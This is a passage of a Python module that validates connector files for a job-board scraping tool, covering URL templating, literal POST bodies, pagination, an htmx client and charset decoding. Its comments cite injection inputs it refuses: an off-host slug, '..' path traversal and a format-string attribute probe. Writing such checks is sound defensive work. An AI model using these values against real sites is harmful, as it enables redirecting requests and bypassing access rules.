    of spaces, where it has nothing to say — and both of those are absent.
    Written once and read by both consumers below, because having the rule in
    only one of them is what let `slug: ""` build `…/jobs/7/` and
    `slug: "   "` build `…/jobs/7/%20%20%20` while every mapped field treated
    the same value as missing.
    """
    return value is not None and value.strip() != ""


def _templated_url(document: Any, template: str) -> str | None:
    """`detail_url_template` with this record's own values substituted.

    **Every substituted value is `quote`d with `safe=""`.** The template's
    scheme and host are written in the connector file, which is reviewed; the
    values come from a remote response, which is not. Escaping every reserved
    character means a value can only ever land as one opaque segment — a
    `slug` of `"//elsewhere.example/x"` becomes `%2F%2Felsewhere.example%2Fx`
    and stays under the host the file names, rather than becoming a
    protocol-relative URL pointing somewhere else. `connector_health`'s
    off-host signal checks the result as well; this is the half that makes the
    check unnecessary rather than merely present.

    A record whose named field is missing, `null`, empty or blank yields
    `None` — no `detail_url` for that row, which `build_offer` handles —
    rather than a URL with a hole in it. A wrong detail URL is worse than an
    absent one on any board that answers 200 to an unknown id, and getmanfred,
    the board this was written for, is one: a made-up offer id returns a page
    whose `pageProps` carries no offer at all, so a broken link there looks
    exactly like a successful fetch.
    """
    parts: list[str] = []
    last = 0
    for match in URL_TEMPLATE_SLOT.finditer(template):
        value = dig(document, compile_path(match.group(1)))
        # `value is None` first only so mypy can narrow; `_present` covers it.
        if value is None or not _present(value):
            return None
        encoded = quote(value, safe="")
        if encoded in {".", ".."}:
            # The "one opaque segment" property above is false for exactly two
            # strings. `.` is unreserved, so `quote` leaves it alone and `..`
            # survives whole, steering the composed URL up a level —
            # `…/ofertas-empleo/../x`. That is a remote value
            # moving a fetch to a path this repo's own robots matcher answers
            # differently about (`/x/../jobs?q=python` allowed where
            # `/jobs?q=python` is refused), which is the whole reason the
            # values are escaped in the first place.
            #
            # Refusing the value, rather than normalising the composed URL and
            # re-asserting its prefix: a refusal reuses the row's existing
            # "no detail_url" outcome instead of introducing a second URL
            # implementation to keep honest, and it fails at the value that is
            # wrong rather than at the string it contaminated. Percent-encoded
            # spellings need no case of their own — quoting happens first, so
            # a value of `%2e%2e` arrives here as `%252e%252e`.
            return None
        parts.append(template[last : match.start()])
        parts.append(encoded)
        last = match.end()
    parts.append(template[last:])
    return "".join(parts)


class JsonSource(Strict):
    """Fields read out of a JSON document instead of out of markup.

    `embedded_in` names the element whose text is that document — for
    schema.org data, `script[type="application/ld+json"]`. Omitting it says the
    response body *is* JSON (a board's own endpoint), which is the simpler
    case and the one this library would rather have.
    """

    embedded_in: str | None = None
    #: Which document, when a page carries several. Every pair must match, by
    #: equality, at the top level — `{"@type": "JobPosting"}` picks the advert
    #: out of a page that also serves a `BreadcrumbList`.
    match: dict[str, str] = Field(default_factory=dict)
    #: List pages only: the path to the array of items. Omitted on a detail
    #: page, where the document *is* the one record.
    items: str | None = None
    #: List pages only: build `detail_url` out of the record's own fields,
    #: for a board that publishes an id and a slug where a URL would do.
    #: `"https://example.com/jobs/{id}/{slug}"`. The alternative is to map
    #: `detail_url` in `fields` from a path the response already carries,
    #: which is the simpler case and the one to prefer when it exists.
    detail_url_template: str | None = None
    fields: dict[str, str] = Field(min_length=1)

    @field_validator("embedded_in")
    @classmethod
    def _host_selector_compiles(cls, css: str | None) -> str | None:
        if css is not None:
            try:
                compile_selector(css)
            except ConnectorError as exc:
                raise ValueError(str(exc)) from exc
        return css

    @field_validator("items")
    @classmethod
    def _items_path_compiles(cls, path: str | None) -> str | None:
        if path is not None:
            try:
                compile_path(path)
            except ConnectorError as exc:
                raise ValueError(str(exc)) from exc
        return path

    @field_validator("detail_url_template")
    @classmethod
    def _url_template_compiles(cls, template: str | None) -> str | None:
        if template is not None:
            try:
                compile_url_template(template)
            except ConnectorError as exc:
                raise ValueError(str(exc)) from exc
        return template

    @field_validator("fields")
    @classmethod
    def _field_paths_compile(cls, fields: dict[str, str]) -> dict[str, str]:
        for name, path in fields.items():
            try:
                compile_path(path)
            except ConnectorError as exc:
                raise ValueError(f"{name}: {exc}") from exc
        return fields


def _json_documents(text: str, source: JsonSource) -> list[Any]:
    """Every JSON document on the page that `source` describes.

    `json.loads` and nothing else — no `eval`, no `ast.literal_eval`, no
    YAML loader that would accept a Python tag.
    """
    if source.embedded_in is None:
        candidates = [text]
    else:
        root = parse_html(text)
        selector = compile_selector(source.embedded_in)
        candidates = [node.raw_text() for node in select_all(root, selector)]

    documents: list[Any] = []
    for candidate in candidates:
        try:
            document = json.loads(candidate)
        except (ValueError, TypeError):
            # A page may carry several `ld+json` blocks and one of them may be
            # broken; that is not a reason to lose the others.
            continue
        if all(
            isinstance(document, dict) and str(document.get(key)) == value
            for key, value in source.match.items()
        ):
            documents.append(document)
    return documents


def _json_record(document: Any, source: JsonSource) -> dict[str, str]:
    record: dict[str, str] = {}
    for name, path in source.fields.items():
        value = dig(document, compile_path(path))
        if value is not None and _present(value):
            record[name] = value
    if source.detail_url_template is not None:
        url = _templated_url(document, source.detail_url_template)
        if url is not None:
            record["detail_url"] = url
    return record


class Pagination(Strict):
    """How a listing continues past its first page. Stored as data for a
    fetcher (T12) to walk — this module never issues a request."""

    #: `body_field` is the POST case: the page number is not in the URL at all
    #: but in the request body, which is where a search back end that takes its
    #: whole query as JSON puts it. `param` then names the body key rather than
    #: a query-string key, and `ListPage` checks that the key exists and holds
    #: the placeholder — see `_a_page_placeholder_and_a_body_field_imply_each_other`.
    mode: Literal["none", "query_param", "path_segment", "body_field"] = "none"
    param: str | None = Field(default=None, min_length=1)
    start: int = Field(default=1, ge=0)
    max_pages: int = Field(default=1, ge=1, le=1000)

    @model_validator(mode="after")
    def _param_named_when_paginating(self) -> Pagination:
        if self.mode != "none" and not self.param:
            raise ValueError("pagination.param is required when pagination.mode is not 'none'")
        return self

    @model_validator(mode="after")
    def _no_pagination_means_exactly_one_page(self) -> Pagination:
        # `mode: none` is a structural claim — "this site has no second
        # page" — not merely "no query parameter is named for it". Leaving
        # `max_pages` above its default of 1 while declaring `mode: none` is
        # a self-contradicting connector: nothing describes what a second,
        # third, ... page's URL would even be, so `build_list_urls` would
        # have nothing to vary and would emit the same URL `max_pages`
        # times — duplicate requests, and duplicate offers once T12 fetches
        # them. Caught here, at load, a contributor sees the mistake in the
        # file they just wrote; `build_list_urls` also defends against this
        # independently (belt-and-suspenders, the same posture the rest of
        # this module takes toward its own safety properties) so that a
        # `page_count` override or a connector loaded before this validator
        # existed still cannot duplicate a request.
        if self.mode == "none" and self.max_pages > 1:
            raise ValueError(
                "pagination.mode is 'none' but max_pages > 1 — a site with no "
                "pagination cannot have more than one page; set mode or lower max_pages"
            )
        return self


def _literal_body_violations(node: Any, where: str = "body_json") -> list[str]:
    """Every reason `node` is not a literal request body.

    The contract T89 fixes in writing, because "literal body" and "substitute
    the page" are only compatible if the exception is written down:

    * the **only** placeholder is `{page}`, and only as a *complete* value —
      a JSON string whose entire content is `"{page}"`;
    * `"page {page} of many"` is **refused**, not passed through. Loud over
      literal: a brace that does nothing looks exactly like a placeholder that
      silently stopped working, and refusing is the posture `url_pattern`
      already takes;
    * a brace anywhere else — in a key, in the middle of a string, alone —
      is refused, which is what stops the next contributor reintroducing
      general templating one convenience at a time;
    * **a key may never be a placeholder.** `{"{page}": 1}` is refused: only
      values substitute, and a body whose *shape* varies by page is not a
      literal body.

    Nothing here is a format string and nothing is concatenated: the body is
    already a parsed structure by the time this sees it (YAML parsed it, once,
    at load), so there is no escaping question and no way to change the body's
    shape. That is the whole difference between this and string templating.
    """
    violations: list[str] = []
    if isinstance(node, str):
        if node != PAGE_PLACEHOLDER and ("{" in node or "}" in node):
            violations.append(
                f"{where}: {node!r} carries a brace but is not the literal "
                f"{PAGE_PLACEHOLDER} placeholder — a request body is literal data, "
                "never a template"
            )
    elif isinstance(node, dict):
        for key, value in node.items():
            if not isinstance(key, str):
                violations.append(f"{where}: key {key!r} is not a string")
                continue
            if "{" in key or "}" in key:
                violations.append(
                    f"{where}: key {key!r} carries a brace — only values substitute, so a "
                    "body whose shape varies by page is not a literal body"
                )
            if names_a_credential(key):
                violations.append(
                    f"{where}: key {key!r} names a credential — a connector may not carry "
                    "one, and a board whose search needs one is a board this tool may not "
                    "read (see the module docstring's 'Carry a credential')"
                )
            violations.extend(_literal_body_violations(value, f"{where}.{key}"))
    elif isinstance(node, list):
        for index, item in enumerate(node):
            violations.extend(_literal_body_violations(item, f"{where}[{index}]"))
    elif isinstance(node, float) and not math.isfinite(node):
        # YAML has `.nan`, `.inf` and `-.inf`; JSON has no spelling for any of
        # them, and `json.dumps` emits the bare words `NaN` and `Infinity`
        # anyway — invalid JSON, sent under a `Content-Type` this engine
        # derived itself. The `date` case below is the same divergence at the
        # level of *types*; this is it at the level of *values*, and it was
        # missed because the type check looked like the whole class.
        violations.append(
            f"{where}: {node} has no JSON spelling — a request body may hold only finite numbers"
        )
    elif not isinstance(node, (bool, int, float)) and node is not None:
        # `yaml.safe_load` also produces `date`/`datetime` for an unquoted
        # date (and `bytes` for `!!binary`, and a `set` for `!!set`), none of
        # which `json.dumps` can serialise. Refused here rather than raised at
        # request-build time, where the connector's author is no longer in the
        # room.
        violations.append(
            f"{where}: {type(node).__name__} is not a JSON value — a request body may hold "
            "only objects, arrays, strings, numbers, booleans and null"
        )
    return violations


def serialise_body(body: Any) -> bytes:
    """The bytes a declared request body is sent as.

    One definition, called by the load-time check and by
    `build_list_requests`, so what a connector may declare is exactly what
    this engine can put on the wire. `allow_nan=False` because the default
    emits the bare words `NaN` and `Infinity`, which are Python's spelling of
    those values and no JSON parser's.
    """
    return json.dumps(body, allow_nan=False, ensure_ascii=False).encode("utf-8")


def _render_path(path: tuple[Any, ...]) -> str:
    """A placeholder position, spelled so no two positions share a spelling.

    Keys are quoted and list indices bracketed, because the obvious dotted
    rendering is ambiguous and the ambiguity was load-bearing: a top-level key
    literally named `Filters.inner` rendered identically to the nested pair
    `Filters` → `inner`, so the second-occurrence check compared two different
    positions as equal and let the nested one through. Positions are compared
    as tuples now and this exists only for the message — which is the other
    half of the same fix, since T109 is about a refusal that misleads.
    """
    if not path:
        return "<root>"
    rendered = ""
    for segment in path:
        if isinstance(segment, int):
            rendered += f"[{segment}]"
        else:
            rendered += f".{segment!r}" if rendered else repr(segment)
    return rendered


def _page_placeholder_paths(node: Any, where: tuple[Any, ...] = ()) -> list[tuple[Any, ...]]:
    """Every position in an already-validated body holding `{page}`.

    Positions, not a boolean, because "is it anywhere" is the question that
    made T109: a lone nested placeholder was refused at load and the *same*
    nested placeholder loaded and substituted the moment a legal top-level one
    sat beside it, so an author who hit the error and added `Page: "{page}"` to
    satisfy it silently acquired a second substitution nothing declared. One
    function answering *where* lets the load check and `build_list_requests` be
    derived from a single rule instead of two readings that agree only on the
    cases somebody happened to test.

    Structural — a tuple of keys and list indices — never a rendered string.
    Every key is walked, including a non-string one: those cannot survive
    `dict[str, Any]` validation, but this also runs over `model_copy` objects
    that never met a validator, and dropping a position because its key has the
    wrong type is the silent miss this function exists to make impossible.
    """
    if isinstance(node, str):
        return [where] if node == PAGE_PLACEHOLDER else []
    if isinstance(node, dict):
        return [
            path
            for key, value in node.items()
            for path in _page_placeholder_paths(value, (*where, key))
        ]
    if isinstance(node, list):
        return [
            path
            for index, item in enumerate(node)
            for path in _page_placeholder_paths(item, (*where, index))
        ]
    return []


#: T133 — the closed client vocabulary.
#:
#: The rule this relaxes is a real one and stays: **a connector cannot name a
#: header.** `headers` on `ListRequest` is derived, never declared, precisely so
#: there is nowhere for an `Authorization` to be written even by a contributor
#: who wants one. `names_a_credential` lints the two places a connector *can*
#: put free text (a POST body's keys, a URL's query string) for the same reason.
#:
#: What that rule also excluded is a board like `foorilla.com` — 259,753 live
#: adverts, robots-allowed, with a real `?job_search=` parameter — whose listing
#: is served only to an htmx request. Measured 2026-09-06 from a browser
#: capture: `HX-Request: true` alone answers **400**, and `HX-Request: true` +
#: `HX-Target: <id>` answers 200 with the full fragment. No cookie, no CSRF
#: token, no account. The site is public; the request simply has a shape.
#:
#: So a connector names a **client**, not a header. The header names below are
#: this file's, not the connector's; the single value that crosses the boundary
#: is `client_target`, which is a DOM element id — validated to a shape with no
#: colon, no whitespace and no newline, so it cannot become a header of its own
#: even by concatenation. There is still nowhere to write a credential.
Client = Literal["htmx"]

#: The id `client_target` may hold: what an HTML `id` attribute looks like, and
#: nothing that could terminate a header or start a second one.
CLIENT_TARGET = re.compile(r"^[A-Za-z][A-Za-z0-9_.:-]{0,63}$")


def client_headers(client: Client | None, target: str | None) -> dict[str, str]:
    """The fixed header set one named client sends. Empty for no client.

    Every name here is a literal in this module. A caller cannot reach this
    with a name of its own, which is the whole property being preserved.
    """
    if client is None:
        return {}
    if client == "htmx":
        headers = {"HX-Request": "true"}
        if target is not None:
            headers["HX-Target"] = target
        return headers
    raise ConnectorError(f"unknown client: {client!r}")  # pragma: no cover - Literal


class ListPage(Strict):
    """The search-results page: how to reach it, how it continues, and one
    selector per item container plus per field within it."""

    #: T133. A named client whose fixed headers this engine sends, never a
    #: header the file names. See `Client` and `client_headers`.
    client: Client | None = None
    #: The DOM id an htmx request targets. Site-specific, so it comes from the
    #: file — as an id, validated as one, and never as a header name or value
    #: of the connector's choosing.
    client_target: str | None = Field(default=None, max_length=64)

    @model_validator(mode="after")
    def _a_target_needs_a_client(self):  # type: ignore[no-untyped-def]
        if self.client_target is not None:
            if self.client is None:
                raise ValueError("client_target names a target for no client — declare `client`")
            if not CLIENT_TARGET.match(self.client_target):
                raise ValueError(
                    f"client_target {self.client_target!r} is not an element id: it must start "
                    "with a letter and hold only letters, digits, _ . : or -"
                )
        return self

    url_pattern: str = Field(min_length=1)
    #: The HTTP method the engine issues for this listing. `GET` by default,
    #: so every connector written before T89 is unchanged — a board whose
    #: search is a POST was simply unreachable, however public it was.
    method: Literal["GET", "POST"] = "GET"
    #: The request body, declared as **data** — a YAML mapping, which is a
    #: parsed structure before this schema ever sees it. There is deliberately
    #: no way to declare a body as text: a body assembled by templating is a
    #: second injection surface, and `url_pattern` already refuses every brace
    #: but `{page}` for exactly that reason. `_literal_body_violations` holds
    #: the line here. The form is JSON and only JSON, which is what makes
    #: `Content-Type` follow from the declaration rather than being a third
    #: thing to get wrong; `build_list_requests` derives it.
    body_json: dict[str, Any] | None = None
    pagination: Pagination = Field(default_factory=Pagination)
    #: Markup route. Required unless `json` is given instead.
    item: str | None = Field(default=None, min_length=1)
    fields: dict[str, FieldSelector] = Field(default_factory=dict)
    #: JSON route — for a board whose listing carries no advert markup at all.
    #: Named `from_json` rather than `json` because `json` is an attribute
    #: pydantic's `BaseModel` already defines.
    from_json: JsonSource | None = None

    @field_validator("item")
    @classmethod
    def _item_selector_compiles(cls, item: str | None) -> str | None:
        if item is None:
            return None
        try:
            compile_selector(item)
        except ConnectorError as exc:
            raise ValueError(str(exc)) from exc
        return item

    @model_validator(mode="after")
    def _exactly_one_route(self) -> ListPage:
        # Two questions, asked separately, because merging them into
        # `item is not None and bool(fields)` let a file declaring `item`
        # *alone* beside `from_json` load: that read as "no markup route", the
        # exclusivity check passed, and `parse_list_page` took the JSON route
        # and ignored the declared selector without a word.
        markup_mentioned = self.item is not None or bool(self.fields)
        if markup_mentioned == (self.from_json is not None):
            raise ValueError(
                "a list page reads either markup (item + fields) or from_json, and must "
                "declare exactly one — declaring both leaves it ambiguous which one produced "
                "a field, and declaring neither is a page that parses to nothing"
            )
        if markup_mentioned and not (self.item is not None and self.fields):
            raise ValueError(
                "the markup route needs both `item` and `fields` — `item` alone selects "
                "containers nothing is read out of, and `fields` alone has no container "
                "to read them from"
            )
        return self

    @field_validator("from_json")
    @classmethod
    def _list_json_names_its_items(cls, source: JsonSource | None) -> JsonSource | None:
        if source is not None and source.items is None:
            raise ValueError(
                "list.from_json.items is required — a list page is an array of records"
            )
        return source

    @field_validator("from_json")
    @classmethod
    def _json_field_names_are_in_the_closed_vocabulary(
        cls, source: JsonSource | None
    ) -> JsonSource | None:
        if source is not None:
            unknown = sorted(set(source.fields) - LIST_FIELD_NAMES)
            if unknown:
                raise ValueError(
                    f"list field name(s) not in the allowed vocabulary: {', '.join(unknown)}"
                )
        return source

    @field_validator("from_json")
    @classmethod
    def _one_answer_for_detail_url(cls, source: JsonSource | None) -> JsonSource | None:
        # `_json_record` writes the template's result last, so declaring both
        # would silently discard the mapped path. Refuse rather than pick: a
        # file saying two things about one field is a file whose author
        # believed one of them.
        if (
            source is not None
            and source.detail_url_template is not None
            and "detail_url" in source.fields
        ):
            raise ValueError(
                "list.from_json declares both a detail_url field and a "
                "detail_url_template — keep whichever is true of the response and "
                "delete the other"
            )
        return source

    @field_validator("fields")
    @classmethod
    def _field_names_are_in_the_closed_vocabulary(
        cls, fields: dict[str, FieldSelector]
    ) -> dict[str, FieldSelector]:
        unknown = sorted(set(fields) - LIST_FIELD_NAMES)
        if unknown:
            raise ValueError(
                f"list field name(s) not in the allowed vocabulary: {', '.join(unknown)}"
            )
        return fields

    @field_validator("url_pattern")
    @classmethod
    def _pattern_uses_only_the_page_placeholder(cls, pattern: str) -> str:
        # `str.format()` over a connector-controlled template is its own
        # injection class (attribute access via `{0.__class__...}`) even
        # though it stops short of code execution — refusing any brace other
        # than the literal `{page}` closes that off structurally, rather than
        # trusting every future caller to keep using `str.replace`.
        bare = pattern.replace(PAGE_PLACEHOLDER, "").replace(QUERY_PLACEHOLDER, "")
        if bare.count("{") or bare.count("}"):
            raise ValueError(
                "url_pattern may only use the literal {page} and {query} "
                f"placeholders: {pattern!r}"
            )
        return pattern

    @field_validator("url_pattern")
    @classmethod
    def _pattern_carries_no_credential(cls, pattern: str) -> str:
        # The same check `body_json` gets, because a request has two halves
        # and the rule was only ever applied to one of them. idealist.org's
        # Algolia call carries its application id and its search key in the
        # *query string*, so until this existed the ledger's claim that such a
        # payload "cannot be written into a connector even by accident" was
        # true of the body and false of the URL.
        named = credential_query_keys(pattern)
        if named:
            raise ValueError(
                f"url_pattern query key(s) {', '.join(repr(key) for key in named)} name a "
                "credential — a connector may not carry one, and a board whose search needs "
                "one is a board this tool may not read (see the module docstring's 'Carry a "
                "credential')"
            )
        return pattern

    @field_validator("body_json")
    @classmethod
    def _body_is_literal(cls, body: dict[str, Any] | None) -> dict[str, Any] | None:
        if body is not None:
            violations = _literal_body_violations(body)
            if violations:
                raise ValueError("; ".join(violations))
            # And then the property the walk above is *for*, asserted directly
            # rather than inferred from having named every way to break it.
            # Enumerating members is how `.nan` got through behind a check
            # that already caught `date`: same divergence, one level down. A
            # lone surrogate is another — a plain `str` every per-node check
            # accepts, that cannot be encoded. This is the same call
            # `build_list_requests` makes, so what loads is what can be sent.
            try:
                serialise_body(body)
            except (TypeError, ValueError, UnicodeEncodeError) as exc:
                raise ValueError(f"body_json is not serialisable as JSON: {exc}") from exc
        return body

    @model_validator(mode="after")
    def _only_a_post_carries_a_body(self) -> ListPage:
        # The default did not move: a GET connector sends no body, and one that
        # declares a body has contradicted its own method rather than quietly
        # getting a body it cannot send.
        if self.body_json is not None and self.method != "POST":
            raise ValueError(
                f"list.body_json is declared but list.method is {self.method!r} — only a "
                "POST carries a request body"
            )
        return self

    @model_validator(mode="after")
    def _a_page_placeholder_and_a_body_field_imply_each_other(self) -> ListPage:
        # Both directions, because each failure is real and they differ. Too
        # narrow — a placeholder the pagination does not name — and the page
        # number lands somewhere nothing declared, so a caller reading
        # `pagination.param` is told the wrong field varies. Too broad — a
        # `body_field` mode over a body with nothing to vary — and every page
        # is the same request, which is the duplicate fetch `mode: none`
        # already guards against, one layer down.
        paths = [] if self.body_json is None else _page_placeholder_paths(self.body_json)
        placeholder = bool(paths)
        if placeholder and self.pagination.mode != "body_field":
            raise ValueError(
                f"list.body_json carries the {PAGE_PLACEHOLDER} placeholder but "
                f"pagination.mode is {self.pagination.mode!r} — a body that paginates must "
                "say so with mode: body_field"
            )
        if self.pagination.mode == "body_field":
            if not placeholder:
                raise ValueError(
                    f"pagination.mode is 'body_field' but no {PAGE_PLACEHOLDER} placeholder "
                    "appears in list.body_json — nothing would vary from page to page"
                )
            body = self.body_json or {}
            # `Pagination` already refuses a nameless param for any mode but
            # `none`, so the `is None` arm is unreachable through a load — it
            # is here because a `model_copy(update=...)` object skips that
            # validator, the same reason `build_list_urls` repeats its clamp.
            param = self.pagination.param
            if param is None or body.get(param) != PAGE_PLACEHOLDER:
                raise ValueError(
                    f"pagination.param is {self.pagination.param!r} but that is not a "
                    f"top-level key of list.body_json holding {PAGE_PLACEHOLDER} — the key "
                    "carrying the page number is the one the pagination must name"
                )
            # T109. The check above is satisfied by the *named* key alone, so
            # before this it passed over a body carrying a second placeholder
            # somewhere else — and `build_list_requests` then substituted that
            # one too, because it walked the whole structure. Same nested
            # value, opposite verdict, decided by whether a legal sibling
            # happened to be present: refused when alone, substituted when
            # not. Only one position may hold the placeholder and it is the
            # one `pagination.param` names, which is exactly what the request
            # builder now varies.
            extra = sorted(_render_path(path) for path in paths if path != (param,))
            if extra:
                raise ValueError(
                    f"list.body_json holds {PAGE_PLACEHOLDER} at {', '.join(extra)} as well "
                    f"as at {param!r} — the key carrying the page number is the only one "
                    "that may hold the placeholder, so a nested or second occurrence is a "
                    "substitution nothing declared"
                )
        return self


class DetailPage(Strict):
    """The single-ad page reached from a list item's `detail_url`."""

    #: T133. A named client whose fixed headers this engine sends, never a
    #: header the file names. See `Client` and `client_headers`.
    client: Client | None = None
    #: The DOM id an htmx request targets. Site-specific, so it comes from the
    #: file — as an id, validated as one, and never as a header name or value
    #: of the connector's choosing.
    client_target: str | None = Field(default=None, max_length=64)

    @model_validator(mode="after")
    def _a_target_needs_a_client(self):  # type: ignore[no-untyped-def]
        if self.client_target is not None:
            if self.client is None:
                raise ValueError("client_target names a target for no client — declare `client`")
            if not CLIENT_TARGET.match(self.client_target):
                raise ValueError(
                    f"client_target {self.client_target!r} is not an element id: it must start "
                    "with a letter and hold only letters, digits, _ . : or -"
                )
        return self

    fields: dict[str, FieldSelector] = Field(default_factory=dict)
    from_json: JsonSource | None = None

    @field_validator("fields")
    @classmethod
    def _field_names_are_in_the_closed_vocabulary(
        cls, fields: dict[str, FieldSelector]
    ) -> dict[str, FieldSelector]:
        unknown = sorted(set(fields) - ALLOWED_OFFER_FIELDS)
        if unknown:
            raise ValueError(
                f"detail field name(s) not in the allowed vocabulary: {', '.join(unknown)}"
            )
        return fields

    @field_validator("from_json")
    @classmethod
    def _json_field_names_are_in_the_closed_vocabulary(
        cls, source: JsonSource | None
    ) -> JsonSource | None:
        if source is not None:
            unknown = sorted(set(source.fields) - ALLOWED_OFFER_FIELDS)
            if unknown:
                raise ValueError(
                    f"detail field name(s) not in the allowed vocabulary: {', '.join(unknown)}"
                )
            if source.items is not None:
                raise ValueError(
                    "detail.from_json.items is not allowed — a detail page is one record, "
                    "not an array"
                )
            if source.detail_url_template is not None:
                raise ValueError(
                    "detail.from_json.detail_url_template is not allowed — the detail page is "
                    "the page this would link to, and `detail_url` is not in the detail "
                    "vocabulary anyway"
                )
        return source

    @model_validator(mode="after")
    def _exactly_one_route(self) -> DetailPage:
        if bool(self.fields) == (self.from_json is not None):
            raise ValueError(
                "a detail page reads either markup (fields) or from_json, and must declare "
                "exactly one"
            )
        return self


# ---------------------------------------------------------------------------
# character encodings — the third small grammar
#
# Every committed capture in this library is UTF-8, and for eighteen packages
# that was not a decision, it was a coincidence: `connector.yaml` had nowhere to
# say otherwise and every fetcher assumed it. `net-empregos.com` — 59,791 live
# Portuguese adverts, clean selectors, robots allowed — broke it by serving
# ISO-8859-1, on which `bytes.decode("utf-8")` raises outright and
# `errors="replace"` gives `T\ufffdcnico de Manuten\ufffd\ufffdo`.
#
# The lenient decode is the dangerous one. It produces an advert that looks
# fine to every check and is wrong in every accented word, which the candidate
# is the first to notice. So nothing here ever replaces: a body that will not
# decode is a refusal.
#
# The label table is **not** `codecs.lookup`. Python maps `iso-8859-1` to true
# Latin-1; the WHATWG Encoding Standard §4.2 maps that label to **windows-1252**,
# because that is what browsers do and therefore what boards are authored
# against. The difference is bytes 0x80-0x9F: undefined in Latin-1, and the
# printable `€ " '` in cp1252. A board's curly apostrophe decoded by the
# stdlib's reading of its own declared label becomes a control character.

#: WHATWG Encoding Standard §4.2, restricted to the labels a job board plausibly
#: declares. Adding a label is adding a line; a label absent here is refused at
#: load rather than guessed at.
ENCODING_LABELS = {
    "utf-8": "utf-8",
    "utf8": "utf-8",
    "unicode-1-1-utf-8": "utf-8",
    "unicode11utf8": "utf-8",
    # Every one of these is a *label of windows-1252* in the standard's index.
    # `iso-8859-1` and `us-ascii` most of all: they are the two a board is most
    # likely to declare and the two the stdlib would read differently.
    "windows-1252": "cp1252",
    "cp1252": "cp1252",
    "iso-8859-1": "cp1252",
    "iso8859-1": "cp1252",
    "iso_8859-1": "cp1252",
    "latin1": "cp1252",
    "l1": "cp1252",
    "csisolatin1": "cp1252",
    "ascii": "cp1252",
    "us-ascii": "cp1252",
    "ansi_x3.4-1968": "cp1252",
    "iso-8859-15": "iso8859-15",
    "iso8859-15": "iso8859-15",
    "iso_8859-15": "iso8859-15",
    "windows-1250": "cp1250",
    "iso-8859-2": "iso8859-2",
    "iso8859-2": "iso8859-2",
    "utf-16le": "utf-16-le",
    "utf-16be": "utf-16-be",
    "utf-16": "utf-16",
}

#: Labels the standard maps to the *replacement* decoder, whose whole purpose is
#: to refuse. A board needing one is out of scope, and accepting the label would
#: yield U+FFFD for every character while looking like a supported encoding.
REPLACEMENT_LABELS = frozenset(
    {"replacement", "iso-2022-cn", "iso-2022-cn-ext", "iso-2022-kr", "hz-gb-2312", "csiso2022kr"}
)

#: Byte-order marks, longest first — UTF-8's prefix does not collide with
#: UTF-16's, but checking the 2-byte marks before a 3-byte one would.
_BOMS: tuple[tuple[bytes, str], ...] = (
    (b"\xef\xbb\xbf", "utf-8"),
    (b"\xff\xfe", "utf-16-le"),
    (b"\xfe\xff", "utf-16-be"),
)


def encoding_for(label: str) -> str:
    """The Python codec for a WHATWG encoding label, or `ConnectorError`.

    Labels are matched ASCII-case-insensitively after stripping whitespace,
    per Encoding §4.2 — `"  ISO-8859-1  "` and `"iso-8859-1"` are the same
    label and a board is free to write either.

    An unknown label is **refused**, not defaulted to UTF-8. A default here
    would turn "this connector's author typed the charset wrong" into
    "every advert from this board is mojibake", which is the failure this
    whole path exists to prevent.
    """
    normalised = label.strip().lower()
    if normalised in REPLACEMENT_LABELS:
        raise ConnectorError(
            f"charset {label!r} maps to the replacement decoder, which refuses everything"
        )
    try:
        return ENCODING_LABELS[normalised]
    except KeyError:
        raise ConnectorError(f"unknown charset label: {label!r}") from None


def decode_body(raw: bytes | str, charset: str = "utf-8") -> str:
    """Decode a fetched body, refusing rather than replacing.

    A byte-order mark wins over `charset` and is removed from the output
    (WHATWG HTML, "Determining the character encoding", step 1). A leftover
    U+FEFF is not cosmetic: it lands inside the first extracted field, so one
    page's first advert differs from every other by an invisible character.

    `errors` is never passed, so a body that does not decode raises. That is
    the point: `errors="replace"` is what produced `T\ufffdcnico` and it is
    indistinguishable, downstream, from an advert that really said that.
    """
    if isinstance(raw, str):
        return raw
    for mark, codec in _BOMS:
        if raw.startswith(mark):
            return raw[len(mark) :].decode(codec)
    try:
        return raw.decode(encoding_for(charset))
    except UnicodeDecodeError as error:
        raise ConnectorError(
            f"body does not decode as {charset!r}: {error}. The connector declares "
            "the wrong charset, or the board changed it — decoding it leniently "
            "would put replacement characters into an advert a candidate reads."
        ) from error


class Connector(Strict):
    """One site's connector — `connectors/<site>_<locale>.yaml`.

    `version` and `last_verified` back `assess_staleness`; `auth` is the only
    place authentication is ever mentioned, and it can only ever name "the
    candidate's own browser session" — see the module docstring's "may not
    carry a credential".
    """

    site: str = Field(pattern=SITE_NAME.pattern, min_length=2, max_length=64)
    locale: Language
    #: The board's character encoding, as a WHATWG label. Defaults to utf-8,
    #: which is what all eighteen packages committed before this existed were
    #: serving — so the default is the measured status quo, not a guess.
    charset: str = "utf-8"

    @field_validator("charset")
    @classmethod
    def _charset_is_a_known_label(cls, charset: str) -> str:
        """Refused at load, like every other unusable field.

        A typo'd charset that survived to fetch time would decode every advert
        from the board wrongly — and cp1252 never raises, so it would do it
        silently. Load is the last place this can fail loudly.
        """
        try:
            encoding_for(charset)
        except ConnectorError as exc:
            raise ValueError(str(exc)) from exc
        return charset

    version: str = Field(pattern=VERSION.pattern)
    last_verified: date
    auth: AuthMode = "none"
    list: ListPage
    detail: DetailPage | None = None

    @field_validator("site")
    @classmethod
    def _site_is_not_a_reserved_source(cls, site: str) -> str:
        # `SEARCH_SOURCE` is the one `site` value that means "no connector
        # produced this" (D-16). A connector allowed to claim it would make
        # `Offer.source` ambiguous exactly where the distinction matters —
        # a candidate being shown web-search results as though a board had
        # been searched — so the name is refused here rather than policed at
        # each of the places that read `source`.
        if site == SEARCH_SOURCE:
            raise ValueError(
                f"{SEARCH_SOURCE!r} is reserved for offers a general web search produced; "
                "a connector may not claim it"
            )
        return site

    @model_validator(mode="after")
    def _something_produces_the_offer_text(self) -> Connector:
        # `Offer.text` (T11) is required and never guessed. A connector that
        # selects nothing for it would only be discovered dead at parse time,
        # against whatever fixture happened to be run first — reject it here
        # instead, where every connector is checked the same way regardless of
        # which page anyone remembers to test.
        list_has_text = "text" in self.list.fields or (
            self.list.from_json is not None and "text" in self.list.from_json.fields
        )
        detail_has_text = self.detail is not None and (
            "text" in self.detail.fields
            or (self.detail.from_json is not None and "text" in self.detail.from_json.fields)
        )
        if not (list_has_text or detail_has_text):
            raise ValueError("no selector produces 'text' — nothing here for the offer body")
        return self


# ---------------------------------------------------------------------------
# loading


def _format(exc: ValidationError) -> str:
    parts = []
    for error in exc.errors():
        location = ".".join(str(part) for part in error["loc"]) or "<root>"
